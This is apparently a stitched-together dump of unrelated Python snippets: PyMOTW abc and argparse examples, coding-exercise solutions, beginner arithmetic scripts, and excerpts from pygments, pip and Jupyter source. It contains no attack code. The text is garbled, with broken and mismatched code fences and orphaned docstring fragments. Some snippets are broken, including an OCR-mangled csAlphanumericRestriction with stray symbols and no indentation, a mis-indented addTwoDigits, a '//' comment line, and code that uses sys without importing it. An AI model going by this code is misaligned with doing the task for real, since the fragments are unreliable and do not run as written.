    def const_behavior():
        return "Static behavior differs"


try:
    o = Base.factory()
    print("Base.value:", o.const_behavior())
except Exception as err:
    print("ERROR:", str(err))

i = Implementation.factory()
print("Implementation.const_behavior :", i.const_behavior())

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import abc
import io


class ABCWithConcreteImplementation(abc.ABC):
    @abc.abstractmethod
    def retrieve_values(self, input):
        print("base class reading data")
        return input.read()


class ConcreteOverride(ABCWithConcreteImplementation):
    def retrieve_values(self, input):
        base_data = super(ConcreteOverride, self).retrieve_values(input)
        print("subclass sorting data")
        response = sorted(base_data.splitlines())
        return response


input = io.StringIO(
    """line one
line two
line three```


```py
)

reader = ConcreteOverride()
print(reader.retrieve_values(input))
print()

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import abc
from abc_base import PluginBase
import abc_subclass
import abc_register

for sc in PluginBase.__subclasses__():
    print(sc.__name__)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import abc
from abc_base import PluginBase


@PluginBase.register
class IncompleteImplementation(PluginBase):
    def save(self, output, data):
        return output.write(data)


if __name__ == "__main__":
    print("Subclass:", issubclass(IncompleteImplementation, PluginBase))
    print("Instance:", isinstance(IncompleteImplementation(), PluginBase))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import abc
from abc_base import PluginBase


class LocalBaseClass:
    pass


@PluginBase.register
class RegisteredImplementation(LocalBaseClass):
    def load(self, input):
        return input.read()

    def save(self, output, data):
        return output.write(data)


if __name__ == "__main__":
    print("Subclass:", issubclass(RegisteredImplementation, PluginBase))
    print("Instance:", isinstance(RegisteredImplementation(), PluginBase))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import abc
from abc_base import PluginBase


class SubclassImplementation(PluginBase):
    def load(self, input):
        return input.read()

    def save(self, output, data):
        return output.write(data)


if __name__ == "__main__":
    print("Subclass:", issubclass(SubclassImplementation, PluginBase))
    print("Instance:", isinstance(SubclassImplementation(), PluginBase))
````

````pyAbsolute Value."""


def abs_val(num):
    """
    Find the absolute value of a number.

    >>> abs_val(-5.1)
    5.1
    >>> abs_val(-5) == abs_val(5)
    True
    >>> abs_val(0)
    0
    """
    return -num if num < 0 else num


def test_abs_val():
    """
    >>> test_abs_val()
    """
    assert 0 == abs_val(0)
    assert 34 == abs_val(34)
    assert 100000000000 == abs_val(-100000000000)


if __name__ == "__main__":
    print(abs_val(-34))  # --> 34

from __future__ import annotations


def abs_max(x: list[int]) -> int:
    """
    >>> abs_max([0,5,1,11])
    11
    >>> abs_max([3,-10,-2])
    -10
    """
    j = x[0]
    for i in x:
        if abs(i) > abs(j):
            j = i
    return j


def abs_max_sort(x):
    """
    >>> abs_max_sort([0,5,1,11])
    11
    >>> abs_max_sort([3,-10,-2])
    -10
    """
    return sorted(x, key=abs)[-1]


def main():
    a = [1, 2, -11]
    assert abs_max(a) == -11
    assert abs_max_sort(a) == -11


if __name__ == "__main__":
    main()

from .abs import abs_val


def absMin(x):
    """
    >>> absMin([0,5,1,11])
    0
    >>> absMin([3,-10,-2])
    -2
    """
    j = x[0]
    for i in x:
        if abs_val(i) < abs_val(j):
            j = i
    return j


def main():
    a = [-3, -1, 2, -11]
    print(absMin(a))  # = -1


if __name__ == "__main__":
    main()

def absolute_value_sum(mylist, x):
    running_sum = 0
    for number in mylist:
        running_sum += abs(number - x)
    return running_sum


def absoluteValuesSumMinimization(a):
    mydict = {}
    for i in range(len(a)):
        mydict[a[i]] = absolute_value_sum(a, a[i])
    return min(mydict, key=mydict.get)

# -*- coding: utf-8 -*-```


```pyActivate virtualenv for current interpreter:

Use exec(open(this_file).read(), {'__file__': this_file}).

This can be used when you must use an existing Python interpreter, not the virtualenv bin/python.```


```py
import os
import site
import sys

try:
    abs_file = os.path.abspath(__file__)
except NameError:
    raise AssertionError(
        "You must use exec(open(this_file).read(), {'__file__': this_file}))"
    )

bin_dir = os.path.dirname(abs_file)
base = bin_dir[
    : -len("bin") - 1
]  # strip away the bin part from the __file__, plus the path separator

# prepend bin to PATH (this file is inside the bin directory)
os.environ["PATH"] = os.pathsep.join(
    [bin_dir] + os.environ.get("PATH", "").split(os.pathsep)
)
os.environ["VIRTUAL_ENV"] = base  # virtual env is right above bin directory

# add the virtual environments libraries to the host python import mechanism
prev_length = len(sys.path)
for lib in "../lib/python3.8/site-packages".split(os.pathsep):
    path = os.path.realpath(os.path.join(bin_dir, lib))
    site.addsitedir(path.decode("utf-8") if "" else path)
sys.path[:] = sys.path[prev_length:] + sys.path[0:prev_length]

sys.real_prefix = sys.prefix
sys.prefix = base

# flake8: noqa
````

```pyThe following implementation assumes that the activities
are already sorted according to their finish time"""
```

```pyPrints a maximum set of activities that can be done by a
single person, one at a time"""
# n --> Total number of activities
# start[]--> An array that contains start time of all activities
# finish[] --> An array that contains finish time of all activities


def printMaxActivities(start, finish):
    """
    >>> start = [1, 3, 0, 5, 8, 5]
    >>> finish = [2, 4, 6, 7, 9, 9]
    >>> printMaxActivities(start, finish)
    The following activities are selected:
    0,1,3,4,
    """
    n = len(finish)
    print("The following activities are selected:")

    # The first activity is always selected
    i = 0
    print(i, end=",")

    # Consider rest of the activities
    for j in range(n):

        # If this activity has start time greater than
        # or equal to the finish time of previously
        # selected activity, then select it
        if start[j] >= finish[i]:
            print(j, end=",")
            i = j


if __name__ == "__main__":
    import doctest

    doctest.testmod()

    start = [1, 3, 0, 5, 8, 5]
    finish = [2, 4, 6, 7, 9, 9]
    printMaxActivities(start, finish)

# Definition for singly-linked list:
# class ListNode(object):
#   def __init__(self, x):
#     self.value = x
#     self.next = None
#
def get_num(a):
    cnt_a = 1
    a_num = ""
    while a.next != None:

        if cnt_a:
            cnt_a = 0
            a_num += str(a.value)
        else:
            a_num += ("0" * (4 - len(str(a.value)))) + str(a.value)

        a = a.next
    a_num += ("0" * (4 - len(str(a.value)))) + str(a.value)

    return int(a_num)


def addTwoHugeNumbers(a, b):

    a_num = get_num(a)
    b_num = get_num(b)
    # print(a_num)
    # print(b_num)

    sm = str(a_num + b_num)
    # print(sm)

    ret_list = []
    sm = sm[-1::-1]
    for i in range(0, len(sm), 4):
        num = sm[i : i + 4]
        num = int(num[-1::-1])

        ret_list += [num]

    ret_list = ret_list[-1::-1]

    return ret_list

num1 = 15
num2 = 12

# Adding two nos
sum = num1 + num2

# printing values
print("Sum of {0} and {1} is {2}".format(num1, num2, sum))

# This program adds two numbers

num1 = 1.5
num2 = 6.3

# Add two numbers
sum = num1 + num2

# Display the sum
print("The sum of {0} and {1} is {2}".format(num1, num2, sum))

def addBorder(picture):
    picture_with_border = []
    for i in range(len(picture)):
        # Add the main border to the picture
        if i == 0:
            picture_with_border.append("*" * (len(picture[i]) + 2))

        picture_with_border.append("*" + "".join(picture[i]) + "*")

        # Add the main border to the picture
        if i == len(picture) - 1:
            picture_with_border.append("*" * (len(picture[i]) + 2))
    return picture_with_border

def addTwoDigits(n):
 """
 Return sum of the two digits in n
 """
    digits = str(n)
    return sum([int(digit) for digit in digits])


# This program adds two numbers

num1 = 1.5
num2 = 6.3

# Add two numbers
sum = num1 + num2

# Display the sum
print("The sum of {0} and {1} is {2}".format(num1, num2, sum))
```

````py
 * Definition for singly-linked list.
 * function ListNode(val, next) {
 *     this.val = (val===undefined ? 0 : val)
 *     this.next = (next===undefined ? null : next)
 * }


 * @param {ListNode} l1
 * @param {ListNode} l2
 * @return {ListNode}```


```py


def addTwoNumbers(l1, l2):
    pass

print()
print()

a = True

while a == True:

    number1 = int(input("enter first number:"))
    number2 = int(input("enter second number:"))
    number3 = int(input("enter third number:"))
    sum = number1 + number2 + number3

    print()
    print("\t\t======================================")
    print()

    print("Addition of three numbers is", " :-- ", sum)

    print()
    print("\t\t======================================")
    print()

    d = input("Do tou want to do it again ??   Y / N -- ").lower()

    if d == "y":

        print()
        print("\t\t======================================")
        print()

        continue

    else:

        exit()

//Python Program to Add Two Numbers
a = int(input("enter first number: "))
b = int(input("enter second number: "))

sum = a + b

print("sum:", sum)

class Graph:
    """Represent a graph as a dictionary of vertices mapping labels to edges."""

    def __init__(self):
        pass

    def add_vertex(self, vertex_id):
        pass

    def add_edge(self, v1, v2):
        pass

    def get_neighbors(self, vertex_id):
        pass

# code up a Graph class implementing with an adjacency list


class Graph:
    """ Represent a Graph as dictionary of vertices map the labels to edges."""

    # constructor
    def __init__(self):
        # empty dictionary for verts
        self.vertices = {}

    # add vertex
    def add_vertex(self, vertex_id):
        # at vertex_id create an empty set
        self.vertices[vertex_id] = set()

    # add edges
    def add_edge(self, v1, v2):
        # if v1 and v2 exist in vertices list
        if v1 in self.vertices and v2 in self.vertices:
            # add v2 at v1 of vertices
            # (add v2 to the vertices list at the index of v1)
            self.vertices[v1].add(v2)
        # otherwise
        else:
            # raise an error
            raise KeyError("That vertex does not exist")

# Given an array of integers, find the pair of adjacent elements that has the largest product and return that product.

# Example

# For inputArray = [3, 6, -2, -5, 7, 3], the output should be
# adjacentElementsProduct(inputArray) = 21.

# 7 and 3 produce the largest product.

# Input/Output

# [execution time limit] 4 seconds (py3)

# [input] array.integer inputArray

# An array of integers containing at least two elements.

# Guaranteed constraints:
# 2 ≤ inputArray.length ≤ 10,
# -1000 ≤ inputArray[i] ≤ 1000.

# [output] integer

# The largest product of adjacent elements.


def adjacentElementsProduct(inputArray):
    # return max(a*b for a, b in zip(inputArray, inputArray[1:]))
    length = len(inputArray)

    sum = []

    for i in range(length - 1):

        sum.append(
            inputArray[i] * inputArray[i + 1]
        )  # append all the values of the product into the array

    return max(sum)

def adjacentElementsProduct(inputArray):
    pair_of_elements, maxproduct = [], -sys.maxsize
    for i in range(len(inputArray) - 1):
        current_product = inputArray[i] * inputArray[i + 1]
        if current_product > maxproduct:
            maxproduct = current_product
            pair_of_elements.append(inputArray[i])
            pair_of_elements.append(inputArray[i + 1])
    return maxproduct
````

````py
    Adler-32 is a checksum algorithm which was invented by Mark Adler in 1995.
    Compared to a cyclic redundancy check of the same length, it trades reliability for
    speed (preferring the latter).
    Adler-32 is more reliable than Fletcher-16, and slightly less reliable than
    Fletcher-32.[2]

    source: https://en.wikipedia.org/wiki/Adler-32```


```py


def adler32(plain_text: str) -> int:
    """
    Function implements adler-32 hash.
    Iterates and evaluates a new value for each character

    >>> adler32('Algorithms')
    363791387

    >>> adler32('go adler em all')
    708642122
    """
    MOD_ADLER = 65521
    a = 1
    b = 0
    for plain_chr in plain_text:
        a = (a + ord(plain_chr)) % MOD_ADLER
        b = (b + a) % MOD_ADLER
    return (b << 16) | a
````

````py
    pygments.lexers.agile
    ~~~~~~~~~~~~~~~~~~~~~

    Just export lexer classes previously contained in this module.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexers.lisp import SchemeLexer
from pygments.lexers.jvm import IokeLexer, ClojureLexer
from pygments.lexers.python import (
    PythonLexer,
    PythonConsoleLexer,
    PythonTracebackLexer,
    Python3Lexer,
    Python3TracebackLexer,
    DgLexer,
)
from pygments.lexers.ruby import RubyLexer, RubyConsoleLexer, FancyLexer
from pygments.lexers.perl import PerlLexer, Perl6Lexer
from pygments.lexers.d import CrocLexer, MiniDLexer
from pygments.lexers.iolang import IoLexer
from pygments.lexers.tcl import TclLexer
from pygments.lexers.factor import FactorLexer
from pygments.lexers.scripting import LuaLexer, MoonScriptLexer

__all__ = []

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Michael Liao"
````

````py
async web application.```


```py

import asyncio

from aiohttp import web


async def index(request):
    await asyncio.sleep(0.5)
    return web.Response(body=b"<h1>Index</h1>")


async def hello(request):
    await asyncio.sleep(0.5)
    text = "<h1>hello, %s!</h1>" % request.match_info["name"]
    return web.Response(body=text.encode("utf-8"))


async def init(loop):
    app = web.Application(loop=loop)
    app.router.add_route("GET", "/", index)
    app.router.add_route("GET", "/hello/{name}", hello)
    srv = await loop.create_server(app.make_handler(), "127.0.0.1", 8000)
    print("Server started at http://127.0.0.1:8000...")
    return srv


loop = asyncio.get_event_loop()
loop.run_until_complete(init(loop))
loop.run_forever()

#!/usr/bin/python
# -*- coding: utf-8 -*-

import math

# Calculating thrust of Aircraft Propeller
def thrust_props(diameter, velocity, velocity1, density):

    # According to formula
    return (
        math.pi / 4 * diameter ** 2 * (velocity + velocity1 / 2) * density * velocity1
    )


print("Hello Aircraft Lovers,\n")

while True:
    # Loop for continous calculation
    start_or_end = str(raw_input("start or end : ")).strip().lower()

    # Main interface
    if start_or_end == "start":
        res = thrust_props(
            float(input("\nDiameter of propeller: ")),
            float(input("Velocity of air flow: ")),
            float(input("Additional propeller acceleration, velocity: ")),
            float(input("Fluid density: ")),
        )
        print("\nThrust of propeller: {}".format(res))

    else:
        quit()
    print("")

# found formula on nasa's website

def Repeat(x):
    _size = len(x)
    repeated = []
    for i in range(_size):
        k = i + 1
        for j in range(k, _size):
            if x[i] == x[j] and x[i] not in repeated:
                repeated.append(x[i])
    return repeated


list1 = [10, 20, 30, 20, 20, 30, 40, 50, -20, 60, 60, -20, -20]
print(Repeat(list1))

# add 1```


```py
1. Take input from caller (num): an integer
- if the input can not be cast to int then throw an exception and gracefully exit function
2. set output to (num plus 1)
3. return output to caller```


```py


def add_one(num):
    try:
        output = int(num) + 1
        return output
    except:
        # print("Value Error input int")
        return f"ERROR: {num} is not an integer: Please input an integer"


# test
print(add_one(4))  # => 5
print(add_one(15))  # => 16
print(add_one(40))  # => 41
name = add_one("65")  # => 65 + 1
print(name)  # => 66

with open("model_dictionary.json", "w") as f:
    json.dump(model_dict, f)
f.close()
with open("company_dictionary.json", "w") as f:
    json.dump(company_dict, f)
f.close()
with open("fuelType_dictionary.json", "w") as f:
    json.dump(fueltype_dict, f)
f.close()
with open("transmission_dictionary.json", "w") as f:
    json.dump(transmission_dict, f)
f.close()
with open("vitals_dictionary.json", "w") as f:
    json.dump(vals, f)
f.close()

l = [1, 2, 3, 4, 0]

# using any evaluates some values and get true if any is true
print(any(l))

print(all(l))
````

````py
        In this problem, we want to determine all possible combinations of k
        numbers out of 1 ... n. We use backtracking to solve this problem.
        Time complexity: O(C(n,k)) which is O(n choose k) = O((n!/(k! * (n - k)!)))```


```py
from typing import List


def generate_all_combinations(n: int, k: int) -> List[List[int]]:
    """
    >>> generate_all_combinations(n=4, k=2)
    [[1, 2], [1, 3], [1, 4], [2, 3], [2, 4], [3, 4]]
    """

    result: List[List[int]] = []
    create_all_state(1, n, k, [], result)
    return result


def create_all_state(
    increment: int,
    total_number: int,
    level: int,
    current_list: List[int],
    total_list: List[List[int]],
) -> None:
    if level == 0:
        total_list.append(current_list[:])
        return

    for i in range(increment, total_number - level + 2):
        current_list.append(i)
        create_all_state(i + 1, total_number, level - 1, current_list, total_list)
        current_list.pop()


def print_all_state(total_list: List[List[int]]) -> None:
    for i in total_list:
        print(*i)


if __name__ == "__main__":
    n = 4
    k = 2
    total_list = generate_all_combinations(n, k)
    print_all_state(total_list)

def allLongestStrings(inputArray):
    # sortedList = sorted(inputArray, key=len, reverse=True)
    max_string_length, longest_strings = max(inputArray, key=len), []
    for i in range(len(inputArray)):
        if len(inputArray[i]) == len(max_string_length):
            longest_strings.append(inputArray[i])
    return longest_strings
````

````py
In this problem, we want to determine all possible subsequences
of the given sequence. We use backtracking to solve this problem.

Time complexity: O(2^n),
where n denotes the length of the given sequence.```


```py
from typing import Any, List


def generate_all_subsequences(sequence: List[Any]) -> None:
    create_state_space_tree(sequence, [], 0)


def create_state_space_tree(
    sequence: List[Any], current_subsequence: List[Any], index: int
) -> None:
    """
    Creates a state space tree to iterate through each branch using DFS.
    We know that each state has exactly two children.
    It terminates when it reaches the end of the given sequence.
    """

    if index == len(sequence):
        print(current_subsequence)
        return

    create_state_space_tree(sequence, current_subsequence, index + 1)
    current_subsequence.append(sequence[index])
    create_state_space_tree(sequence, current_subsequence, index + 1)
    current_subsequence.pop()


if __name__ == "__main__":
    seq: List[Any] = [3, 1, 2, 4]
    generate_all_subsequences(seq)

    seq.clear()
    seq.extend(["A", "B", "C"])
    generate_all_subsequences(seq)

def zeros(arr, n):
    count = 0
    for i in range(n):
        if arr[i] != 0:
            arr[count] = arr[i]
            count += 1

    while count < n:
        arr[count] = 0
        count += 1


def print_arr(arr, n):
    for i in range(n):
        print(arr[i], end=" ")


arr = [1, 0, 0, 2, 5, 0]
zeros(arr, len(arr))
print_arr(arr, len(arr))

def is_increasing_sequence(sequence):
    for i in range(len(sequence) - 1):
        if sequence[i] >= sequence[i + 1]:
            return i
    return -1


def almostIncreasingSequence(sequence):
    j = is_increasing_sequence(sequence)
    if j == -1:
        return True
    if is_increasing_sequence(sequence[j - 1 : j] + sequence[j + 1 :]) == -1:
        return True  # Deleting earlier element makes it increasing
    if is_increasing_sequence(sequence[j : j + 1] + sequence[j + 2 :]) == -1:
        return True  # Deleting later element makes it increasing
    return False

def csAlphanumericRestriction(input_str): #c is every char in
input string
is_numeric = False
is_alpha = False
for c in input_str:
% if c.isnumeric():
is_numeric = True
elif c.isalpha():
is_alpha = True
else:
‘ return False
return (is_numeric and not is_alpha) or (is_alpha and not
is_numeric)
I

def alphabeticShift(inputString):
    outputString = ""
    for i in range(len(inputString)):
        outputString += chr((ord(inputString[i]) + 1 - 97) % 26 + 97)
    return outputString

from __future__ import absolute_import, division, unicode_literals

from . import base

from collections import OrderedDict


def _attr_key(attr):
    """Return an appropriate key for an attribute for sorting

    Attributes have a namespace that can be either ``None`` or a string. We
    can't compare the two because they're different types, so we convert
    ``None`` to an empty string first.

    """
    return (attr[0][0] or ""), attr[0][1]


class Filter(base.Filter):
    """Alphabetizes attributes for elements"""

    def __iter__(self):
        for token in base.Filter.__iter__(self):
            if token["type"] in ("StartTag", "EmptyTag"):
                attrs = OrderedDict()
                for name, value in sorted(token["data"].items(), key=_attr_key):
                    attrs[name] = value
                token["data"] = attrs
            yield token

def alternatingSums(a):
    team1, team2 = [], []
    for i in range(len(a)):
        if i % 2 == 0:
            team1.append(a[i])
        else:
            team2.append(a[i])
    return [sum(team1), sum(team2)]

def alternative_string_arrange(first_str: str, second_str: str) -> str:
    """
    Return the alternative arrangements of the two strings.
    :param first_str:
    :param second_str:
    :return: String
    >>> alternative_string_arrange("ABCD", "XY")
    'AXBYCD'
    >>> alternative_string_arrange("XY", "ABCD")
    'XAYBCD'
    >>> alternative_string_arrange("AB", "XYZ")
    'AXBYZ'
    >>> alternative_string_arrange("ABC", "")
    'ABC'
    """
    first_str_length: int = len(first_str)
    second_str_length: int = len(second_str)
    abs_length: int = (
        first_str_length if first_str_length > second_str_length else second_str_length
    )
    output_list: list = []
    for char_count in range(abs_length):
        if char_count < first_str_length:
            output_list.append(first_str[char_count])
        if char_count < second_str_length:
            output_list.append(second_str[char_count])
    return "".join(output_list)


if __name__ == "__main__":
    print(alternative_string_arrange("AB", "XYZ"), end=" ")

class Among(object):
    def __init__(self, s, substring_i, result, method=None):
        """
        @ivar s search string
        @ivar substring index to longest matching substring
        @ivar result of the lookup
        @ivar method method to use if substring matches
        """
        self.s = s
        self.substring_i = substring_i
        self.result = result
        self.method = method

l = [
    "angor",
    "argon",
    "goran",
    "grano",
    "groan",
    "nagor",
    "Orang",
    "orang",
    "organ",
    "rogan",
    "Ronga",
]

for w in l:
    sw = "".join(sorted(w.lower()))
    print(sw)

def SortAnagram(arr):
    temp = []
    stage = []
    dic = []

    for i in arr:
        for j in i:
            stage.append(j)
        stage.sort()
        temp.append("".join(stage))
        stage = []

    for index, value in enumerate(temp):
        dic.append([index, value])

    temp = []
    dic = sorted(dic, key=lambda x: x[1])
    for i in range(len(dic)):
        stage.append(dic[i][0])

    for i in stage:
        temp.append(arr[i])

    print(temp)


arr = ["cat", "dog", "tac", "god", "act"]

SortAnagram(arr)

import collections
import os
import pprint
import time

start_time = time.time()
print("creating word list...")
path = os.path.split(os.path.realpath(__file__))
with open(path[0] + "/words.txt") as f:
    word_list = sorted(list({word.strip().lower() for word in f}))


def signature(word):
    return "".join(sorted(word))


word_bysig = collections.defaultdict(list)
for word in word_list:
    word_bysig[signature(word)].append(word)


def anagram(my_word):
    return word_bysig[signature(my_word)]


print("finding anagrams...")
all_anagrams = {word: anagram(word) for word in word_list if len(anagram(word)) > 1}

print("writing anagrams to file...")
with open("anagrams.txt", "w") as file:
    file.write("all_anagrams = ")
    file.write(pprint.pformat(all_anagrams))

total_time = round(time.time() - start_time, 2)
print(("Done [", total_time, "seconds ]"))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class Animal(object):
    def run(self):
        print("Animal is running...")


class Dog(Animal):
    def run(self):
        print("Dog is running...")


class Cat(Animal):
    def run(self):
        print("Cat is running...")


def run_twice(animal):
    animal.run()
    animal.run()


a = Animal()
d = Dog()
c = Cat()

print("a is Animal?", isinstance(a, Animal))
print("a is Dog?", isinstance(a, Dog))
print("a is Cat?", isinstance(a, Cat))

print("d is Animal?", isinstance(d, Animal))
print("d is Dog?", isinstance(d, Dog))
print("d is Cat?", isinstance(d, Cat))

run_twice(c)

# Given a start integer and an ending integer (both inclusive), write a function that returns the count (not the sum) of all integers in the range (except integers that contain the digit 5).

# Examples:

# csAnythingButFive(1, 5) -> 1, 2, 3, 4, -> 4 (there are 4 integers in the range that do not contain the digit 5)
# csAnythingButFive(1, 9) -> 1, 2, 3, 4, 6, 7, 8, 9 -> 8
# csAnythingButFive(4, 17) -> 4,6,7,8,9,10,11,12,13,14,16,17 -> 12
# Notes:

# The output can contain the digit 5.
# The start number will always be less than the end number (both numbers can also be negative).
# [execution time limit] 4 seconds (py3)

# [input] integer start

# [input] integer end

# [output] integer


def csAnythingButFive(start, end):
    count = 0
    new_list = []
    for num in range(start, end + 1):
        str_num = str(num)
        if "5" in str_num:
            continue
        count += 1
    return count


print(csAnythingButFive(1, 5))
print(csAnythingButFive(1, 9))
print(csAnythingButFive(4, 17))
print(csAnythingButFive(-4, 17))
print(csAnythingButFive(0, 7))
print(csAnythingButFive(-14, -5))
# uper
# input 2 integers
# output 1 integer = a count of numbers in range(start, end)
# start < end
# the 2 nums cand be negative
# PLAN
# for loop in range(start, end + 1)
# if num == 5 skip
# else count(num)

import fnmatch
import os

# constants
PATH = "./"
PATTERN = "*."


def get_file_names(filepath, pattern):
    matches = []
    if os.path.exists(filepath):
        for root, dirnames, filenames in os.walk(filepath):
            for filename in fnmatch.filter(filenames, pattern):
                # matches.append(os.path.join(root, filename))  # full path
                matches.append(os.path.join(filename))  # just file name
        if matches:
            print("Found {} files:".format(len(matches)))
            output_files(matches)
        else:
            print("No files found.")
    else:
        print("Sorry that path does not exist. Try again.")


def output_files(list_of_files):
    for filename in list_of_files:
        print(filename)


if __name__ == "__main__":
    get_file_names(PATH, PATTERN)

import json
from tornado import web, gen
from ..base.handlers import APIHandler


class TerminalRootHandler(APIHandler):
    @web.authenticated
    def get(self):
        models = self.terminal_manager.list()
        self.finish(json.dumps(models))

    @web.authenticated
    def post(self):
        """POST /terminals creates a new terminal and redirects to it"""
        model = self.terminal_manager.create()
        self.finish(json.dumps(model))


class TerminalHandler(APIHandler):
    SUPPORTED_METHODS = ("GET", "DELETE")

    @web.authenticated
    def get(self, name):
        model = self.terminal_manager.get(name)
        self.finish(json.dumps(model))

    @web.authenticated
    @gen.coroutine
    def delete(self, name):
        yield self.terminal_manager.terminate(name, force=True)
        self.set_status(204)
        self.finish()

from moviepy.editor import *

clip = VideoFileClip("FROZEN Full UK Trailer Official Disney UK.mp4")
clip.write_gif("output.gif")
````

````py
This code wraps the vendored appdirs module to so the return values are
compatible for the current pip code base.

The intention is to rewrite current usages gradually, keeping the tests pass,
and eventually drop this after all usages are changed.```


```py

import os
from typing import List

from pip._vendor import appdirs as _appdirs


def user_cache_dir(appname: str) -> str:
    return _appdirs.user_cache_dir(appname, appauthor=False)


def user_config_dir(appname: str, roaming: bool = True) -> str:
    path = _appdirs.user_config_dir(appname, appauthor=False, roaming=roaming)
    if _appdirs.system == "darwin" and not os.path.isdir(path):
        path = os.path.expanduser("~/.config/")
        if appname:
            path = os.path.join(path, appname)
    return path


# for the discussion regarding site_config_dir locations
# see <https://github.com/pypa/pip/issues/1733>
def site_config_dirs(appname: str) -> List[str]:
    dirval = _appdirs.site_config_dir(appname, appauthor=False, multipath=True)
    if _appdirs.system not in ["win32", "darwin"]:
        # always look in /etc directly as well
        return dirval.split(os.pathsep) + ["/etc"]
    return [dirval]

def areEquallyStrong(yourLeft, yourRight, friendsLeft, friendsRight):
    myStrongestArm = max(yourLeft, yourRight)
    myWeakestArm = min(yourLeft, yourRight)
    friendStrongestArm = max(friendsLeft, friendsRight)
    friendWeakestArm = min(friendsLeft, friendsRight)
    if myStrongestArm == friendStrongestArm and myWeakestArm == friendWeakestArm:
        return True
    else:
        return False

def areSimilar(a, b):
    for i in range(len(a)):
        sorted_a, sorted_b = sorted(a), sorted(b)
        if sorted_a != sorted_b:
            return False

        inversions = 0
        for i in range(len(a)):
            if a[i] != b[i]:
                inversions += 1
        return inversions == 2 or inversions == 0

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser()

parser.add_argument("-i", metavar="in-file", type=argparse.FileType("rt"))
parser.add_argument("-o", metavar="out-file", type=argparse.FileType("wt"))

try:
    results = parser.parse_args()
    print("Input file:", results.i)
    print("Output file:", results.o)
except IOError as msg:
    parser.error(str(msg))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLong option name example.```


```py

# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(description="Example with nonoptional arguments")

parser.add_argument("count", action="store", type=int)
parser.add_argument("units", action="store")

print(parser.parse_args())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser()

parser.add_argument("--mode", choices=("read-only", "read-write"))

print(parser.parse_args())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(conflict_handler="resolve")

parser.add_argument("-a", action="store")
parser.add_argument("-b", action="store", help="Short alone")
parser.add_argument("--long-b", "-b", action="store", help="Long and short together")

print(parser.parse_args(["-h"]))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(conflict_handler="resolve")

parser.add_argument("-a", action="store")
parser.add_argument("--long-b", "-b", action="store", help="Long and short together")
parser.add_argument("-b", action="store", help="Short alone")

print(parser.parse_args(["-h"]))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(add_help=True)

parser.add_argument("-a", action="store_true", default=False)
parser.add_argument("-b", action="store", dest="b")
parser.add_argument("-c", action="store", dest="c", type=int)

print("print_usage output:")
parser.print_usage()
print()

print("print_help output:")
parser.print_help()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(description="Short sample app")

parser.add_argument("--optional", action="store_true", default=False)
parser.add_argument("positional", action="store")

print(parser.parse_args())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse
import shlex

parser = argparse.ArgumentParser(
    description="Short sample app", fromfile_prefix_chars="@"
)

parser.add_argument("-a", action="store_true", default=False)
parser.add_argument("-b", action="store", dest="b")
parser.add_argument("-c", action="store", dest="c", type=int)

print(parser.parse_args(["@argparse_fromfile_prefix_chars.txt"]))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLong option name example.```


```py

# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(description="Example with long option names")

parser.add_argument("--noarg", action="store_true", default=False)
parser.add_argument("--witharg", action="store", dest="witharg")
parser.add_argument("--witharg2", action="store", dest="witharg2", type=int)

print(parser.parse_args(["--noarg", "--witharg", "val", "--witharg2=3"]))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(
    add_help=True, formatter_class=argparse.MetavarTypeHelpFormatter
)

parser.add_argument("-i", type=int, dest="notshown1")
parser.add_argument("-f", type=float, dest="notshown2")

parser.print_help()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser()

group = parser.add_mutually_exclusive_group()
group.add_argument("-a", action="store_true")
group.add_argument("-b", action="store_true")

print(parser.parse_args())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser()

parser.add_argument("--three", nargs=3)
parser.add_argument("--optional", nargs="?")
parser.add_argument("--all", nargs="*", dest="all")
parser.add_argument("--one-or-more", nargs="+")

print(parser.parse_args())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyParent with shared options```


```py

# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(add_help=False)

parser.add_argument("--user", action="store")
parser.add_argument("--password", action="store")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyParent with shared options```


```py

# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(add_help=False)

group = parser.add_argument_group("authentication")

group.add_argument("--user", action="store")
group.add_argument("--password", action="store")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySet prefix_chars```


```py

# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(
    description="Change the option prefix characters", prefix_chars="-+/"
)

